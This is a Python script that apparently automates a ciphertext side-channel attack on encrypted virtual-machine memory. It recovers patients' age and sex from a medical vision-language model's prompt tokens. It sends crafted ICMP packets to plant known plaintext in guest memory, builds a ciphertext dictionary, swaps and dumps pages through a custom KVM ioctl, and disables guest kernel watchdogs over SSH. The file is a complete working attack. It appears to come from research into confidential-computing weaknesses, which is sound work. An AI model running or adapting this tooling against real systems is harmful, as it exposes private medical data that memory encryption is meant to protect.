#!/usr/bin/env python3
"""
orchestrate_v3_metadata.py — Metadata recovery via AES-XEX side channel.

Target: Age + Sex fields in the Qwen2-VL medical prompt.

Post-vision_end token layout (fixed interstitials, variable values):
  [header×13] [Ethnicity?] [" Age:" age_ids "."] [" Sex:" sex_tok "."] [" Reason:" indication]

Combined dictionary entry = age_ids + [13, 6695, 25, sex_tok]
  ("." + " Sex:" + sex_value)
  → covers age through sex in one contiguous block.
  → tok_start_age is exactly computable from N + ethnicGroup presence.

Ethnicity-dependent tok_start_age offsets (rel. to vision_end):
  no ethnicity  → +16
  white (1-tok) → +21
  hispanic      → +22
  non-hispanic  → +24

Build phases: 190 ages × 2 sexes × avg 8.5 rotations ≈ 3,230 total.
Sweep cost:   1 targeted GPA lookup per sample (no range scan needed).

Usage:
    sudo python3 orchestrate_v3_metadata.py --build [--swap-tool ./swap_pages_tool]
    sudo python3 orchestrate_v3_metadata.py --run-all [--swap-tool ./swap_pages_tool]
"""

import argparse
import csv
import ctypes
import datetime
import fcntl
import json
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# logging
# ---------------------------------------------------------------------------

_log_fh = None


def log(msg: str = "", file=None) -> None:
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    out = f"[{ts}] {msg}" if msg and not msg.startswith("  ") else msg
    print(out, file=file or sys.stdout)
    if _log_fh and file is None:
        print(out, file=_log_fh)
        _log_fh.flush()


def log_err(msg: str) -> None:
    log(msg, file=sys.stderr)
    if _log_fh:
        print(msg, file=_log_fh)
        _log_fh.flush()


HERE = Path(__file__).parent

GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = (Path(f"/home/{_sudo_user}/.ssh/id_ed25519")
              if _sudo_user else Path.home() / ".ssh/id_ed25519")
SSH_BASE   = [
    "ssh", "-p", GUEST_PORT,
    "-i", str(_ssh_key),
    "-o", "StrictHostKeyChecking=no",
    "-o", "BatchMode=yes",
    "-o", "ConnectTimeout=30",
    GUEST_SSH,
]

READ_GPA   = HERE / "read_gpa.py"
SWAP_TOOL  = HERE / "swap_pages_tool"
DICT_CACHE = HERE / "dict_cache_meta.json"
DICT_DIR   = HERE / "dict_pages_meta"

DEST_IP          = "192.168.100.2"
ICMP_PAYLOAD_MIN = 4097

IMAGE_PAD_TOKEN_ID = 151655

# ---------------------------------------------------------------------------
# Age token construction
# ---------------------------------------------------------------------------

_SPACE  = 220
_DIGIT  = {i: 15 + i for i in range(10)}   # 0→15 … 9→24
_YEARS  = 1635    # " years"
_MONTHS = 3951    # " months"
_DAYS   = 2849    # " days"
_OLD    = 2310    # " old"

# interstitial between age_ids and sex_tok in the prompt:
#   "."[13]  " Sex:"[6695, 25]
_SEX_GLUE = [13, 6695, 25]


def _age_ids(n: int, unit_tok: int) -> list[int]:
    """Token IDs for ' N <unit> old' (space-prefixed, no trailing period)."""
    digits = [_DIGIT[int(d)] for d in str(n)]
    return [_SPACE] + digits + [unit_tok, _OLD]


def _age_label(n: int, unit: str) -> str:
    return f"{n} {unit} old"


# ---------------------------------------------------------------------------
# Token label definitions
# ---------------------------------------------------------------------------

_SEX_DEFS = [
    ("male",   [8593]),   # group 0 → token_idx = 0 * N_AGE + age_i
    ("female", [8778]),   # group 1 → token_idx = 1 * N_AGE + age_i
]

# Enumerate all (age_label, age_ids) pairs
_AGE_ENTRIES: list[tuple[str, list[int]]] = []
for _n in range(0, 121):    # 0–120 years
    _AGE_ENTRIES.append((_age_label(_n, "years"), _age_ids(_n, _YEARS)))
for _n in range(0, 37):     # 0–36 months
    _AGE_ENTRIES.append((_age_label(_n, "months"), _age_ids(_n, _MONTHS)))
for _n in range(0, 32):     # 0–31 days
    _AGE_ENTRIES.append((_age_label(_n, "days"),   _age_ids(_n, _DAYS)))

N_AGE = len(_AGE_ENTRIES)   # 190
N_SEX = len(_SEX_DEFS)      # 2

# Build TOKEN_LABELS: token_idx = sex_i * N_AGE + age_i
#   group 0 (male):   0 … N_AGE-1
#   group 1 (female): N_AGE … 2*N_AGE-1
#   sentinel:         2*N_AGE
TOKEN_LABELS: list[tuple[str, list[int]]] = []
for sex_i, (sex_name, sex_ids) in enumerate(_SEX_DEFS):
    for age_i, (age_lbl, age_ids_) in enumerate(_AGE_ENTRIES):
        TOKEN_LABELS.append(
            (f"{sex_name} | {age_lbl}",
             age_ids_ + _SEX_GLUE + sex_ids)
        )
TOKEN_LABELS.append(("image_pad×4", [IMAGE_PAD_TOKEN_ID] * 4))

_IPAD4_IDX = len(TOKEN_LABELS) - 1  # 2*N_AGE = 380


def _decode_label(token_idx: int) -> tuple[str, str]:
    """Return (age_label, sex_name) for a given token_idx."""
    sex_i  = token_idx // N_AGE
    age_i  = token_idx % N_AGE
    return _AGE_ENTRIES[age_i][0], _SEX_DEFS[sex_i][0]


# Sweep priority: most common ages first (medical dataset skews adult)
# years 18–90 → months → days → remaining years; male before female per age.
def _build_label_order() -> list[int]:
    order = []
    def _add(age_i: int) -> None:
        order.append(0 * N_AGE + age_i)   # male
        order.append(1 * N_AGE + age_i)   # female
    # common adult years
    for _n in list(range(18, 91)) + list(range(2, 18)) + [0, 1] + list(range(91, 121)):
        _add(_n)                           # years: age_i = n (0-120)
    # months (age_i = 121 + n, n=0..36)
    for _n in range(0, 37):
        _add(121 + _n)
    # days (age_i = 158 + n, n=0..31)
    for _n in range(0, 32):
        _add(158 + _n)
    return order

_LABEL_ORDER = _build_label_order()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DRAIN_EVERY   = 16
FIRST_PAD_POS = 15   # vision_end position = FIRST_PAD_POS + N

GUEST_SCRIPT_DEFAULT = "~/medical_ml/med_vlm/scripts/single_inference_indication_gpa.py"
GUEST_CWD_DEFAULT    = "~/medical_ml/med_vlm/scripts"
GUEST_PYTHON_DEFAULT = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_SAMPLES_JSON   = "~/medical_ml/med_vlm/scripts/filtered_samples.json"
_GPA_TIMEOUT         = 150

# tok_start_age offset from vision_end, keyed by ethnicGroup value
_ETH_AGE_VE_OFFSET: dict[str | None, int] = {
    None:           16,   # no ethnicity field in prompt
    "white":        21,   # 1-tok ethnicity value
    "hispanic":     22,   # 2-tok
    "non-hispanic": 24,   # 4-tok
}

RESULTS_CSV = HERE / "run_all_v3_metadata.csv"


def _compute_tok_start_age(N: int, eth_value) -> int:
    """Exact token index of age_ids start = vision_end + eth_offset."""
    offset = _ETH_AGE_VE_OFFSET.get(eth_value, 16)
    return FIRST_PAD_POS + N + offset   # vision_end is at FIRST_PAD_POS + N


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


def run(label: str, cmd: list) -> None:
    log(f"  $ {' '.join(str(c) for c in cmd)}")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        log_err(f"[!] {label} failed (exit {rc})")
        sys.exit(1)


# ---------------------------------------------------------------------------
# ICMP send
# ---------------------------------------------------------------------------

def _icmp_checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i + 1] << 8) + data[i]
    if len(data) & 1:
        s += data[-1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _make_icmp_payload(token_ids: list[int], prefix: int = 0) -> bytes:
    token_bytes  = struct.pack(f"<{len(token_ids)}q", *token_ids)
    payload_size = max(ICMP_PAYLOAD_MIN, prefix + len(token_bytes) + 1)
    remaining    = payload_size - prefix
    repeated     = (token_bytes * (remaining // len(token_bytes) + 1))[:remaining]
    return b"\x00" * prefix + repeated


def _send_icmp(payload: bytes) -> None:
    pid = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, pid, 0)
    chk = _icmp_checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", 8, 0, chk, pid, 0)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        s.sendto(hdr + payload, (DEST_IP, 0))
    finally:
        s.close()


# ---------------------------------------------------------------------------
# GPA acquisition
# ---------------------------------------------------------------------------

def acquire_gpa(payload_ids: list[int], prefix: int = 0) -> tuple[int, int]:
    ssh("sudo dmesg -C")
    _send_icmp(_make_icmp_payload(payload_ids, prefix=prefix))
    time.sleep(1)

    out = ""
    gpas = []
    for attempt in range(3):
        out  = ssh("sudo dmesg", timeout=40)
        gpas = re.findall(r"sub-page\[\d+\]\s+GPA=0x([0-9a-f]+)", out, re.IGNORECASE)
        if gpas:
            break
        if attempt < 2:
            time.sleep(3)

    if not gpas:
        raise RuntimeError("[!] No GPA in guest dmesg")

    gpa     = int(gpas[-1], 16)
    frag_p1 = 970
    m = re.search(r"frag\[0\].*?\boff=(\d+)", out)
    if m:
        frag_off = int(m.group(1))
        frag_p1  = 4096 - (frag_off % 4096) - 8
    return gpa, frag_p1


def _acquire_retry(payload_ids: list[int], prefix: int = 0,
                   retries: int = 5) -> tuple[int, int]:
    for attempt in range(retries):
        try:
            return acquire_gpa(payload_ids, prefix)
        except RuntimeError as e:
            log_err(f"  {e} (attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                wait = 10 * (attempt + 1)
                log(f"  sleeping {wait}s before retry...")
                time.sleep(wait)
    raise RuntimeError(f"acquire_gpa failed after {retries} attempts")


# ---------------------------------------------------------------------------
# Swap-back + kernel page dump
# ---------------------------------------------------------------------------

_KVMIO             = 0xAE
_PAGE_SIZE         = 4096
KVM_READ_PAGE_DUMP = (0x80000000
                      | ((_PAGE_SIZE & 0x3FFF) << 16)
                      | (_KVMIO << 8)
                      | 0x2b)


def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, _PAGE_SIZE, 16):
        addr = gpa + i
        lo   = int.from_bytes(raw[i:i+8],    "little")
        hi   = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{addr:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Drain guest ICMP receive buffer
# ---------------------------------------------------------------------------

def drain_guest_rxbuf() -> None:
    out = ssh(
        "sudo python3 << 'PYEOF'\n"
        "import socket, select\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n"
        "s.setblocking(False)\n"
        "n = 0\n"
        "while select.select([s], [], [], 0.3)[0]:\n"
        "    try:\n"
        "        s.recv(65536)\n"
        "        n += 1\n"
        "    except OSError:\n"
        "        break\n"
        "s.close()\n"
        "print(f'drained {n} pkts')\n"
        "PYEOF",
        timeout=20,
    )
    log(f"  [drain] {out.strip()}")


# ---------------------------------------------------------------------------
# Guest inference acquisition
# ---------------------------------------------------------------------------

def _acquire_gpa_raw(index: int,
                     script: str = GUEST_SCRIPT_DEFAULT,
                     cwd:    str = GUEST_CWD_DEFAULT,
                     python: str = GUEST_PYTHON_DEFAULT) -> tuple:
    """Run guest --gpa-only; return (base_gpa, proc) or (None, None)."""
    nvidia_lib = (
        "$(ls -d /usr/local/lib/python3.10/dist-packages/nvidia/*/lib 2>/dev/null"
        " | tr '\\n' ':')"
    )
    cmd = (f"source ~/miniconda3/etc/profile.d/conda.sh && conda activate vlm && "
           f"export LD_LIBRARY_PATH={nvidia_lib}$LD_LIBRARY_PATH && "
           f"cd {cwd} && sudo -E env LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH\" "
           f"{python} -u {script} --index {index} --gpa-only")
    log(f"  [guest] running index={index}")

    for attempt in range(3):
        proc   = subprocess.Popen(SSH_BASE + [cmd],
                                  stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, text=True)
        result: dict = {}

        def _reader(stdout, out):
            for line in stdout:
                print(f"  [guest] {line}", end="", flush=True)
                if _log_fh:
                    _log_fh.write(f"  [guest] {line}")
                    _log_fh.flush()
                m = re.search(r"input_ids base GPA:\s+0x([0-9a-f]+)", line, re.IGNORECASE)
                if m:
                    out["base_gpa"] = int(m.group(1), 16)
                    break

        t = threading.Thread(target=_reader, args=(proc.stdout, result), daemon=True)
        t.start()
        t.join(timeout=_GPA_TIMEOUT)

        if "base_gpa" in result:
            log(f"  [host] base_gpa=0x{result['base_gpa']:x}")
            return result["base_gpa"], proc

        try:
            proc.kill()
        except Exception:
            pass
        proc.wait()
        log_err(f"[!] GPA timeout/failed index={index} ({attempt + 1}/3)")
        if attempt < 2:
            time.sleep(15)

    return None, None


# ---------------------------------------------------------------------------
# Swap-read + ciphertext comparison helpers
# ---------------------------------------------------------------------------

_HEX_LINE_CP = re.compile(r'[0-9a-f]{12,16}:\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)')


def _swap_read_raw(swap_tool: str, dict_gpa: int, target_page_gpa: int) -> bytes | None:
    r = subprocess.run(
        [swap_tool, f"0x{dict_gpa:x}", f"0x{target_page_gpa:x}", "--swap-back"],
        capture_output=True)
    if r.returncode != 0:
        log_err(f"  [meta] swap failed dict=0x{dict_gpa:x} "
                f"page=0x{target_page_gpa:x} (rc={r.returncode})")
        return None
    kvm_fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(_PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        return bytes(buf)
    finally:
        os.close(kvm_fd)


def _parse_cp_file(path: Path) -> bytes | None:
    try:
        chunks = []
        with open(path, "r", errors="replace") as f:
            for line in f:
                m = _HEX_LINE_CP.search(line)
                if m:
                    chunks.append(struct.pack("<QQ", int(m.group(1), 16),
                                                    int(m.group(2), 16)))
        return b"".join(chunks) if chunks else None
    except Exception:
        return None


def _clean_aes_blocks(token_offset: int, token_len: int) -> list[int]:
    end        = token_offset + token_len
    first_full = (token_offset + 15) & ~15
    return [b for b in range(first_full, end - 15, 16) if b + 16 <= 4096]


def _verify_raw(raw: bytes, cp_data: bytes,
                token_offset: int, token_len: int) -> bool:
    blocks = _clean_aes_blocks(token_offset, token_len)
    if not blocks:
        return False
    return all(raw[b:b + 16] == cp_data[b:b + 16] for b in blocks)


# ---------------------------------------------------------------------------
# Targeted metadata sweep
# ---------------------------------------------------------------------------

def sweep_meta(base_gpa: int, cache: dict, swap_tool: str,
               N: int, eth_value) -> tuple:
    """
    Probe the age+sex token region at the exact computed GPA offset.

    tok_start_age = FIRST_PAD_POS + N + _ETH_AGE_VE_OFFSET[eth_value]
    age_gpa       = base_gpa + tok_start_age * 8
    age_byte_off  = age_gpa & 0xFFF    ← cache lookup key
    age_page_gpa  = age_gpa & ~0xFFF   ← swap target

    Compares all registered (age, sex) entries at that byte offset.
    Returns (age_label, sex_name, token_idx) or (None, None, None).
    """
    tok_start_age = _compute_tok_start_age(N, eth_value)
    age_gpa       = base_gpa + tok_start_age * 8
    age_byte_off  = age_gpa & 0xFFF
    age_page_gpa  = age_gpa & ~0xFFF

    off_key = hex(age_byte_off)
    entries = cache.get(off_key, {})
    if not entries:
        log_err(f"[meta] no cache entries at offset {off_key} "
                f"(tok_start_age={tok_start_age}, N={N}, eth={eth_value})")
        return None, None, None

    log(f"[meta] probing tok_start_age={tok_start_age}  "
        f"age_byte_off={off_key}  candidates={len(entries)}")

    _swap_cache: dict[tuple[int, int], bytes | None] = {}
    _cp_cache:   dict[str, bytes | None]             = {}
    n_no_blocks = n_mismatch = 0

    for token_idx in _LABEL_ORDER:
        entry = entries.get(str(token_idx))
        if entry is None:
            continue
        label, token_ids = TOKEN_LABELS[token_idx]
        dict_gpa  = int(entry["gpa"], 16)
        cp_path   = Path(entry["cp_file"])
        token_len = len(token_ids) * 8

        swap_key = (dict_gpa, age_page_gpa)
        if swap_key not in _swap_cache:
            _swap_cache[swap_key] = _swap_read_raw(swap_tool, dict_gpa, age_page_gpa)
        raw = _swap_cache[swap_key]
        if raw is None:
            continue

        cp_key = str(cp_path)
        if cp_key not in _cp_cache:
            _cp_cache[cp_key] = _parse_cp_file(cp_path)
        cp_data = _cp_cache[cp_key]
        if cp_data is None:
            continue

        if raw == cp_data:
            _swap_cache[swap_key] = None
            continue

        blocks = _clean_aes_blocks(age_byte_off, token_len)
        if not blocks:
            n_no_blocks += 1
            continue

        if _verify_raw(raw, cp_data, age_byte_off, token_len):
            age_lbl, sex_name = _decode_label(token_idx)
            log(f"[meta] MATCH  age='{age_lbl}'  sex='{sex_name}'  "
                f"tok_start_age={tok_start_age}  age_gpa=0x{age_gpa:x}")
            out_path = HERE / f"meta_ts{tok_start_age}_t{token_idx}.out"
            out_path.write_text(_bytes_to_xp_dump(dict_gpa, raw) + "\n")
            return age_lbl, sex_name, token_idx
        n_mismatch += 1

    log_err(f"[meta] No match at {off_key}: "
            f"no_blocks={n_no_blocks} mismatch={n_mismatch}")
    return None, None, None


# ---------------------------------------------------------------------------
# run_all
# ---------------------------------------------------------------------------

def run_all(swap_tool: str) -> None:
    if not DICT_CACHE.exists():
        log_err("[run-all] dict_cache_meta.json not found — run --build first")
        sys.exit(1)
    with open(DICT_CACHE) as f:
        cache = json.load(f)
    log(f"[run-all] Loaded cache: {len(cache)} offset entries")

    r = subprocess.run(SSH_BASE + [f"cat {GUEST_SAMPLES_JSON}"],
                       capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        log_err(f"[run-all] failed to read {GUEST_SAMPLES_JSON}: {r.stderr.strip()}")
        sys.exit(1)
    samples = json.loads(r.stdout)
    log(f"[run-all] {len(samples)} samples loaded")

    _CSV_FIELDS = [
        "timestamp", "index",
        "verdict",
        "age_predicted", "sex_predicted",
        "token_idx", "tok_start_age",
        "age_gt", "sex_gt", "ethnicity_gt",
    ]

    done_indices: set[int] = set()
    if RESULTS_CSV.exists():
        with open(RESULTS_CSV, newline="") as f:
            done_indices = {int(r["index"]) for r in csv.DictReader(f)}
        log(f"[run-all] Resuming: {len(done_indices)} already done")

    need_header = not RESULTS_CSV.exists() or RESULTS_CSV.stat().st_size == 0
    csv_fh = open(RESULTS_CSV, "a", newline="")
    writer = csv.DictWriter(csv_fh, fieldnames=_CSV_FIELDS)
    if need_header:
        writer.writeheader()

    n_done = n_match = 0
    try:
        for i, sample in enumerate(samples):
            index = sample["index"]
            N     = sample.get("N")
            eth   = sample.get("ethnicGroup")
            age_gt = sample.get("age", "")
            sex_gt = sample.get("sex", "")

            if index in done_indices:
                log(f"[run-all] {i + 1}/{len(samples)} index={index} — skip")
                continue

            if N is None:
                log_err(f"[run-all] index={index} — missing N, skip")
                continue
            if not age_gt:
                log_err(f"[run-all] index={index} — no age field, skip")
                continue

            log(f"\n[run-all] {i + 1}/{len(samples)} index={index}"
                f"  age_gt={age_gt!r}  sex_gt={sex_gt!r}  eth={eth!r}")

            base_gpa, proc = _acquire_gpa_raw(index)
            if base_gpa is None:
                row = dict(index=index, verdict="GPA_FAIL",
                           age_predicted="", sex_predicted="", token_idx="",
                           tok_start_age="",
                           age_gt=age_gt, sex_gt=sex_gt, ethnicity_gt=eth or "")
            else:
                age_pred, sex_pred, token_idx = sweep_meta(
                    base_gpa, cache, swap_tool, N, eth)

                if proc is not None:
                    try:
                        proc.kill()
                        proc.wait()
                    except Exception:
                        pass

                verdict = "MATCH" if token_idx is not None else "NO_MATCH"
                tok_start_age = _compute_tok_start_age(N, eth)
                row = dict(
                    index=index, verdict=verdict,
                    age_predicted=age_pred or "",
                    sex_predicted=sex_pred or "",
                    token_idx=token_idx if token_idx is not None else "",
                    tok_start_age=tok_start_age,
                    age_gt=age_gt, sex_gt=sex_gt, ethnicity_gt=eth or "",
                )
                log(f"[run-all] index={index}  verdict={verdict}"
                    f"  age={age_pred}  sex={sex_pred}")

            row["timestamp"] = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
            writer.writerow(row)
            csv_fh.flush()
            n_done += 1
            if row["verdict"] == "MATCH":
                n_match += 1
    finally:
        csv_fh.close()

    log(f"\n[run-all] Done: {n_done} processed, {n_match} matched → {RESULTS_CSV}")


# ---------------------------------------------------------------------------
# Build parameters (rotation scheme)
# ---------------------------------------------------------------------------

def _get_build_params(token_ids: list[int]) -> list[list[int]]:
    """N rotations for N-token combined entry (all ≥ 8 tokens → always clean AES blocks)."""
    n = len(token_ids)
    return [token_ids[r:] + token_ids[:r] for r in range(n)]


# ---------------------------------------------------------------------------
# Build dictionary
# ---------------------------------------------------------------------------

def build_dict(swap_tool: str) -> dict:
    DICT_DIR.mkdir(exist_ok=True)

    # Resume: load existing cache; only build phases whose .out file is missing.
    if DICT_CACHE.exists():
        with open(DICT_CACHE) as f:
            cache = json.load(f)
        _done_cp = {
            entry["cp_file"]
            for offsets in cache.values()
            for entry in offsets.values()
        }
        log(f"[build] Resuming from existing cache ({len(cache)} offset entries,"
            f" {len(_done_cp)} done phases)")
    else:
        cache    = {}
        _done_cp = set()
        log("[build] Fresh build — no existing cache")

    total_phases  = sum(len(_get_build_params(ids)) for _, ids in TOKEN_LABELS)
    phase_num     = 0
    drain_count   = 0
    _last_frag_p1: int | None = None

    for token_idx, (label, token_ids) in enumerate(TOKEN_LABELS):
        rotations = _get_build_params(token_ids)
        n_phases  = len(rotations)
        n         = len(rotations[0])
        L         = n * 8
        cmp_len   = L
        align_mod = 8   # all entries ≥ 8 tok → ≥ 2 clean AES blocks at any 8B-aligned offset

        for rot, payload_ids in enumerate(rotations):
            phase_num += 1
            cp_name = f"t{token_idx}_p{rot}"
            cp_path = DICT_DIR / f"{cp_name}.out"

            if cp_path.exists() and str(cp_path) in _done_cp:
                log(f"[build {phase_num}/{total_phases}] t{token_idx}"
                    f" rot={rot}/{n_phases}  [skip]")
                continue
            elif cp_path.exists():
                # file present but not in cache → stale, delete and rebuild
                cp_path.unlink()

            log(f"\n[build {phase_num}/{total_phases}] t{token_idx}"
                f" '{label[:55]}'  L={L}B  rot={rot}/{n_phases}"
                f"\n  payload={payload_ids}")

            drain_count += 1
            if drain_count % DRAIN_EVERY == 0:
                log("  [drain] flushing guest ICMP receive buffer...")
                drain_guest_rxbuf()

            if _last_frag_p1 is None:
                try:
                    _, fp = _acquire_retry(payload_ids, prefix=0)
                    _last_frag_p1 = fp
                    log(f"  [probe] frag_p1={fp}")
                except RuntimeError as e:
                    log_err(f"  [!] Probe failed: {e} — skipping")
                    continue

            dict_gpa = actual_landing = None
            for _attempt in range(4):
                align_prefix = _last_frag_p1 % align_mod
                try:
                    dict_gpa, actual_frag_p1 = _acquire_retry(payload_ids,
                                                               prefix=align_prefix)
                except RuntimeError as e:
                    log_err(f"  [!] Send failed: {e} — skipping phase")
                    _last_frag_p1 = None
                    dict_gpa = None
                    break
                actual_landing = (align_prefix - actual_frag_p1) % 4096
                _last_frag_p1  = actual_frag_p1
                if actual_landing % align_mod == 0:
                    break
                log(f"  [align-retry {_attempt + 1}] landing=0x{actual_landing:x}"
                    f" not {align_mod}B-aligned")
            else:
                log_err("  [!] Could not get 8B-aligned landing — skipping")
                dict_gpa = None

            if dict_gpa is None:
                continue

            log(f"  dict_gpa=0x{dict_gpa:x}  actual_landing=0x{actual_landing:x}")

            run("read_gpa (dict build)",
                [sys.executable, str(READ_GPA),
                 str(DICT_DIR / cp_name), f"0x{dict_gpa:x}"])

            reg_start = (actual_landing - rot * 8) % L
            covered   = []
            off = reg_start
            while off < 4096:
                off_key = hex(off)
                if off_key not in cache:
                    cache[off_key] = {}
                cache[off_key][str(token_idx)] = {
                    "gpa":     hex(dict_gpa),
                    "cp_file": str(cp_path),
                    "cmp_len": cmp_len,
                }
                covered.append(off_key)
                off += L
            _done_cp.add(str(cp_path))
            log(f"  registered {len(covered)} offsets: "
                f"{covered[:4]}{'...' if len(covered) > 4 else ''}")

            # Save after every rotation so interrupted builds can resume cleanly.
            with open(DICT_CACHE, "w") as f:
                json.dump(cache, f, indent=2)

    built = sum(len(v) for v in cache.values())
    log(f"[build] Complete. {built} (offset×token) entries in {DICT_CACHE}")
    drain_guest_rxbuf()
    return cache


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main() -> None:
    ssh("echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/hardlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1",
        timeout=30)

    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--build",     action="store_true",
                   help="Build age×sex combined dictionary then exit")
    p.add_argument("--run-all",   action="store_true",
                   help="Recover age+sex for all filtered_samples.json entries")
    p.add_argument("--swap-tool", default=str(SWAP_TOOL))
    p.add_argument("--log-file",  default=None)
    args = p.parse_args()

    global _log_fh
    if args.log_file:
        _log_fh = open(args.log_file, "a")

    total_phases = sum(len(_get_build_params(ids)) for _, ids in TOKEN_LABELS)
    if args.build:
        log(f"[build] {N_AGE} ages × {N_SEX} sexes = {N_AGE*N_SEX} entries"
            f"  {total_phases} phases")
        build_dict(args.swap_tool)
    elif args.run_all:
        run_all(args.swap_tool)
    else:
        p.error("specify --build or --run-all")

    if _log_fh:
        _log_fh.close()


if __name__ == "__main__":
    main()
